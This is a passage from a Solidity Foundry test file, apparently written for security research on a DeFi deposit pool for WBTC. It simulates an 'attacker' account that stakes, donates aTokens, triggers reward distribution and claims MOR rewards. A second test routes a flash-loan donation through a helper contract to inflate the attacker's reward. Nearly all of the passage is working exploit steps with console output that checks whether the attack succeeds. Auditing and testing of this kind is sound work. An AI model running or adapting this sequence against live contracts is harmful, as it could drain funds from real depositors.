        _stake(POOL_WBTC, attacker, 1e8);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        _donateFrom(attacker, WBTC, aTok, 1e6);
        _distributeAs(attacker);
        vm.warp(block.timestamp + 28 days + 2);
        _unbrickFeeds();
        _distributeAs(third);
        uint256 rew = IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker);
        uint256 ethBefore = attacker.balance;
        vm.startPrank(attacker, attacker);
        IDepositPoolM3(POOL_WBTC).claim{value: 0.06 ether}(0, attacker);
        vm.stopPrank();
        uint256 ethAfter = attacker.balance;
        console.log("D9c reward claimed MOR", rew);
        uint256 sentFee = 0.06 ether;
        console.log("D9c ETH sent wei", sentFee);
        console.log("D9c net ETH consumed wei (fee after refund)", ethBefore - ethAfter);
        console.log("D9c reward after", IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker));
        require(ethBefore - ethAfter < 0.06 ether, "D9c: no refund happened?");
    }

    // ---- D10b: flash sequence with repayment pre-funded from the contract's OWN money ----
    // If this succeeds while D10 reverts, the only blocker in D10 is repaying the sunk donation.
    function testD10b_FlashLoanPrefunded() public {
        (, , , , address aTok) = _poolInfo(POOL_WBTC);
        deal(WBTC, attacker, 10 * 1e8);
        _approveDist(WBTC, attacker);
        _stake(POOL_WBTC, attacker, 1e8);
        _unbrickFeeds();
        vm.warp(block.timestamp + 86401);
        FlashDonorM3 fd = new FlashDonorM3();
        fd.setup(DIST, _aavePool(), aTok);
        deal(WBTC, address(fd), 3e5); // fd's own money: covers amount+premium pull
        (bool ok, ) = _try(address(fd), abi.encodeWithSignature("go(address,uint256)", WBTC, 2e5));
        console.log("D10b prefunded flash ok?", ok ? 1 : 0);
        console.log("D10b fd WBTC bal after (own money minus premium)", IERC20M3(WBTC).balanceOf(address(fd)));
        console.log("D10b fd aWBTC bal after", IERC20M3(aTok).balanceOf(address(fd)));
        console.log("D10b attacker reward (fd donation landed)", IDepositPoolM3(POOL_WBTC).getLatestUserReward(0, attacker));
        require(ok, "D10b: prefunded flash should succeed");
        require(IERC20M3(aTok).balanceOf(address(fd)) == 0, "D10b: fd kept aWBTC?");
    }
}
